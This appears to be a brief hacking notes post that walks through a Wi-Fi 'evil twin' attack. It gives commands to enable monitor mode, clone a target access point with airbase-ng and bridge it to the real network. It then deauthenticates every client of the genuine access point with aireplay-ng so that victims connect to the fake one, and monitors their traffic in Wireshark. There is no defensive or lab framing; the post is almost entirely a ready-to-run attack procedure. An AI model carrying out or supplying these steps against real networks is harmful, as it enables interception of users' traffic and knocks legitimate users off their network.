---
title: "Evil Twin"
date: 2025-01-22T05:59:08-03:00
tags: ['hacking']
---
Environment: NIC with monitor mode capabilities

1. Enable monitor mode in NIC
- Take down the internet facing interface: ifconfic INTERFACE down
- Enable monitor mode: iwconfig INTERFACE mode monitor
- Kill all processes that might conflict with aircrack: `airmon-ng check INTERFACE`, kill PID

2. Set up fake Access Point
- Retrieve network parameters of WiFI access point: `airodump-ng INTERFACE`
- Create fake Access Point: `airbase-ng -a MAC --essid SSID -c CHANNEL INTERFACE`
- Setup internet redirection from evil access point to original access point:

```bash
      brctl addbr EVIL
      brctl addif EVIL INTERFACE
      brctl addif EVIL at0
      ifconfig at0 0.0.0.0 up
      ifconfig EVIL up
      dhclient EVIL
```

3. Force every user to connect to Evil Access Point
- Deauthenticate everyone connected to original Access Point: `aireplay-ng --deauth 0 -a MAC INTERFACE`
- USers will automastically attempt connectionto Evil Access Point

4. Monitor traffic
- Through Wireshark monitor EVIL interface


https://www.kalitutorials.net/2014/07/evil-twin-tutorial.html

http://www.kalitutorials.net/2016/08/hacking-wpawpa-2-without.html
